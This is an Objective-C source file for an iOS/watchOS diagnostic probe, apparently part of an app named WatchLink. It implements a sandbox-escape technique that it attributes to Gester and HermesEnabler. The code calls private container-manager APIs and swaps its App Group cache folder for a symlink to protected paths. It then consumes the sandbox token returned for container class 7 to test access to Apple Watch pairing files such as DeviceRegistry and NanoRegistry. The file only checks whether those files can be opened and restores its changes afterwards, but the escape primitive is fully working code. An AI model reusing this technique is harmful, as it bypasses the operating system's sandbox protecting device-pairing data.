// Class-7 MCM access strategy adapted from Gester and HermesEnabler 2 (MIT).
// Original notices are retained in licenses/ and THIRD_PARTY_NOTICES.md.
#import "Probe.h"
#import <CoreFoundation/CoreFoundation.h>
#import <TargetConditionals.h>
#import <dlfcn.h>
#import <errno.h>
#import <fcntl.h>
#import <stdlib.h>
#import <sys/stat.h>
#import <unistd.h>

static void *Resolve(void *library, const char *a, const char *b) {
    void *value = dlsym(library, a);
    return value ?: (b ? dlsym(library, b) : NULL);
}

static NSArray *OwnGroups(void) {
    void *security = dlopen("/System/Library/Frameworks/Security.framework/Security", RTLD_NOW);
    typedef CFTypeRef (*Create)(CFAllocatorRef);
    typedef CFTypeRef (*Copy)(CFTypeRef, CFStringRef, CFErrorRef *);
    Create create = (Create)Resolve(security ?: RTLD_DEFAULT, "SecTaskCreateFromSelf", NULL);
    Copy copy = (Copy)Resolve(security ?: RTLD_DEFAULT, "SecTaskCopyValueForEntitlement", NULL);
    NSMutableArray *groups = [NSMutableArray array];
    if (create && copy) {
        CFTypeRef task = create(kCFAllocatorDefault);
        if (task) {
            CFTypeRef value = copy(task, CFSTR("com.apple.security.application-groups"), NULL);
            if (value) {
                if (CFGetTypeID(value) == CFArrayGetTypeID())
                    for (id group in (__bridge NSArray *)value)
                        if ([group isKindOfClass:NSString.class] && [group hasSuffix:@".watchlink.probe"])
                            [groups addObject:group];
                CFRelease(value);
            }
            CFRelease(task);
        }
    }
    if (security) dlclose(security);
    return groups;
}

static NSDictionary *Inspect(NSString *path) {
    struct stat info;
    if (lstat(path.fileSystemRepresentation, &info) != 0)
        return @{@"metadata": @NO, @"open": @NO, @"errno": @(errno)};
    // No directory enumeration, file-content extraction, or system-symlink following.
    int descriptor = open(path.fileSystemRepresentation, O_RDONLY | O_CLOEXEC | O_NOFOLLOW);
    int error = descriptor < 0 ? errno : 0;
    if (descriptor >= 0) close(descriptor);
    return @{@"metadata": @YES, @"directory": @(S_ISDIR(info.st_mode)),
        @"symlink": @(S_ISLNK(info.st_mode)), @"open": @(descriptor >= 0), @"errno": @(error)};
}

static BOOL Restore(NSString *cache, NSString *backup, NSString *journal, NSString **error) {
    NSFileManager *fm = NSFileManager.defaultManager;
    if (![fm fileExistsAtPath:journal]) return YES;
    NSDictionary *record = [NSDictionary dictionaryWithContentsOfFile:journal];
    NSString *target = record[@"target"];
    if (![target isKindOfClass:NSString.class] || !target.isAbsolutePath) {
        *error = @"Invalid recovery journal. Cache left untouched."; return NO;
    }
    struct stat info;
    if (lstat(cache.fileSystemRepresentation, &info) == 0) {
        if (!S_ISLNK(info.st_mode)) {
            // Crash between journal write and rename: recognize the exact original directory.
            if (![fm fileExistsAtPath:backup] && S_ISDIR(info.st_mode) &&
                [record[@"inode"] unsignedLongLongValue] == (unsigned long long)info.st_ino &&
                [record[@"device"] unsignedLongLongValue] == (unsigned long long)info.st_dev)
                return [fm removeItemAtPath:journal error:nil];
            *error = @"Cache differs from probe journal. Nothing replaced."; return NO;
        }
        NSString *destination = [fm destinationOfSymbolicLinkAtPath:cache error:nil];
        if (![destination isEqualToString:target] || unlink(cache.fileSystemRepresentation) != 0) {
            *error = @"Could not safely remove the probe link."; return NO;
        }
    }
    if ([fm fileExistsAtPath:backup]) {
        if (rename(backup.fileSystemRepresentation, cache.fileSystemRepresentation) != 0) {
            *error = @"Original cache could not be restored. Backup retained."; return NO;
        }
    } else if (![fm createDirectoryAtPath:cache withIntermediateDirectories:YES attributes:nil error:nil]) {
        *error = @"Could not restore empty cache directory."; return NO;
    }
    return [fm removeItemAtPath:journal error:nil];
}

static NSDictionary *ProtectedInspect(NSString *path) {
    NSFileManager *fm = NSFileManager.defaultManager;
    NSArray *groups = OwnGroups();
    if (!groups.count) return @{@"attempted": @NO, @"reason": @"Signature needs a valid dedicated App Group ending .watchlink.probe."};
    NSURL *root = [fm containerURLForSecurityApplicationGroupIdentifier:groups.firstObject];
    if (!root) return @{@"attempted": @NO, @"reason": @"Dedicated group container unavailable."};
    NSString *library = [root.path stringByAppendingPathComponent:@"Library"];
    [fm createDirectoryAtPath:library withIntermediateDirectories:YES attributes:nil error:nil];
    NSString *cache = [library stringByAppendingPathComponent:@"Caches"];
    NSString *backup = [library stringByAppendingPathComponent:@"WatchLinkProbe.original"];
    NSString *journal = [library stringByAppendingPathComponent:@"WatchLinkProbe.journal.plist"];
    NSString *error;
    if (!Restore(cache, backup, journal, &error)) return @{@"attempted": @NO, @"reason": error ?: @"Recovery failed."};
    if ([fm fileExistsAtPath:backup]) return @{@"attempted": @NO, @"reason": @"Unexpected backup exists. Nothing replaced."};
    struct stat original = {0};
    BOOL hadCache = lstat(cache.fileSystemRepresentation, &original) == 0;
    if (hadCache && !S_ISDIR(original.st_mode)) return @{@"attempted": @NO, @"reason": @"Cache is not a directory."};
    void *mcm = dlopen("/usr/lib/system/libsystem_containermanager.dylib", RTLD_NOW | RTLD_LOCAL);
    if (!mcm) return @{@"attempted": @NO, @"reason": @"MCM library unavailable."};
    typedef void *(*Create)(void);
    typedef void (*Number)(void *, uint64_t);
    typedef void (*Object)(void *, void *);
    typedef void *(*Get)(void *);
    typedef char *(*Token)(void *);
    typedef void (*Free)(void *);
    typedef int64_t (*Consume)(const char *);
    typedef int64_t (*Release)(int64_t);
    typedef void *(*String)(const char *);
    Create create = (Create)Resolve(mcm,"container_query_create",NULL);
    Number setClass = (Number)Resolve(mcm,"container_query_set_class",NULL);
    Object setGroup = (Object)Resolve(mcm,"container_query_set_group_identifiers",NULL);
    Number setPart = (Number)Resolve(mcm,"container_query_operation_set_part","container_query_set_part");
    Number setFlags = (Number)Resolve(mcm,"container_query_operation_set_flags","container_query_set_flags");
    Get get = (Get)Resolve(mcm,"container_query_get_single_result",NULL);
    Token token = (Token)Resolve(mcm,"container_copy_sandbox_token",NULL);
    Free freeQuery = (Free)Resolve(mcm,"container_query_free",NULL);
    Consume consume = (Consume)dlsym(RTLD_DEFAULT,"sandbox_extension_consume");
    Release release = (Release)dlsym(RTLD_DEFAULT,"sandbox_extension_release");
    String string = (String)dlsym(RTLD_DEFAULT,"xpc_string_create");
    Free freeString = (Free)dlsym(RTLD_DEFAULT,"xpc_release");
    if (!create || !setClass || !setGroup || !setPart || !setFlags || !get || !token ||
        !freeQuery || !consume || !release || !string || !freeString) {
        dlclose(mcm); return @{@"attempted": @NO, @"reason": @"Required API symbols unavailable."};
    }
    NSString *target = [path.pathExtension isEqualToString:@"plist"] ? path.stringByDeletingLastPathComponent : path;
    NSMutableDictionary *result = [@{@"attempted": @YES, @"extensionAcquired": @NO} mutableCopy];
    BOOL journalCreated = NO;
    int64_t handle = -1;
    @try {
        journalCreated = [@{@"target": target, @"inode": @((unsigned long long)original.st_ino),
            @"device": @((unsigned long long)original.st_dev)} writeToFile:journal atomically:YES];
        if (!journalCreated) result[@"reason"] = @"Recovery journal could not be written.";
        else if (hadCache && rename(cache.fileSystemRepresentation, backup.fileSystemRepresentation) != 0) {
            [fm removeItemAtPath:journal error:nil]; journalCreated = NO;
            result[@"reason"] = @"Cache move denied.";
        } else if (symlink(target.fileSystemRepresentation, cache.fileSystemRepresentation) != 0)
            result[@"reason"] = @"Temporary link denied.";
        else {
            void *query = create();
            if (query) {
                void *identifier = string([groups.firstObject UTF8String]);
                if (identifier) {
                    setClass(query,7); setGroup(query,identifier); setPart(query,3); setFlags(query,0x8100000000ULL);
                    void *answer = get(query);
                    char *extension = answer ? token(answer) : NULL;
                    if (extension) { handle = consume(extension); free(extension); }
                    freeString(identifier);
                }
                freeQuery(query);
            }
            result[@"extensionAcquired"] = @(handle >= 0);
            result[@"extensionResult"] = @(handle);
            result[@"access"] = Inspect(path);
        }
    } @catch (__unused NSException *exception) {
        result[@"reason"] = @"MCM operation raised an exception.";
    } @finally {
        if (handle >= 0) release(handle);
        NSString *cleanupError;
        BOOL restored = !journalCreated || Restore(cache,backup,journal,&cleanupError);
        result[@"cacheRestored"] = @(restored);
        if (!restored) result[@"recoveryError"] = cleanupError ?: @"Recovery needed.";
        dlclose(mcm);
    }
    return result;
}

NSString *DWRunProbe(BOOL protectedAccess) {
    @autoreleasepool {
        NSArray *paths = @[
            @[@"Pairing registry directory", @"/private/var/mobile/Library/DeviceRegistry"],
            @[@"Pairing state directory", @"/private/var/mobile/Library/DeviceRegistry.state"],
            @[@"NanoRegistry directory candidate", @"/private/var/mobile/Library/NanoRegistry"],
            @[@"NanoRegistry preferences candidate", @"/private/var/mobile/Library/Preferences/com.apple.NanoRegistry.plist"],
            @[@"NetworkRelay preferences candidate", @"/private/var/mobile/Library/Preferences/com.apple.networkrelay.plist"]];
        NSMutableArray *checks = [NSMutableArray array];
        for (NSArray *candidate in paths) {
            NSString *path = candidate[1];
            NSMutableDictionary *check = [@{@"label": candidate[0], @"normalAccess": Inspect(path)} mutableCopy];
            if (protectedAccess) {
                check[@"protectedProbe"] = ProtectedInspect(path);
                check[@"afterLeaseReleased"] = Inspect(path);
            }
            [checks addObject:check];
        }
        NSDictionary *bundle = NSBundle.mainBundle.infoDictionary;
        NSDictionary *report = @{@"schema": @1, @"app": @"WatchLink", @"version": bundle[@"CFBundleShortVersionString"] ?: @"?",
            @"build": bundle[@"CFBundleVersion"] ?: @"?", @"platform": TARGET_OS_WATCH ? @"watchOS" : @"iOS",
            @"os": NSProcessInfo.processInfo.operatingSystemVersionString, @"uid": @(getuid()), @"euid": @(geteuid()),
            @"timestamp": @([[NSDate date] timeIntervalSince1970]), @"protectedProbeRequested": @(protectedAccess),
            @"checks": checks, @"pairingChanged": @NO, @"keyMaterialRead": @NO, @"dualPairingImplemented": @NO,
            @"keyPreservationVerified": @NO, @"interpretation": @"File-open access does not prove keychain access, key preservation, protocol compatibility, or dual pairing."};
        NSData *json = [NSJSONSerialization dataWithJSONObject:report options:NSJSONWritingPrettyPrinted | NSJSONWritingSortedKeys error:nil];
        return json ? [[NSString alloc] initWithData:json encoding:NSUTF8StringEncoding] : @"Report serialization failed.";
    }
}
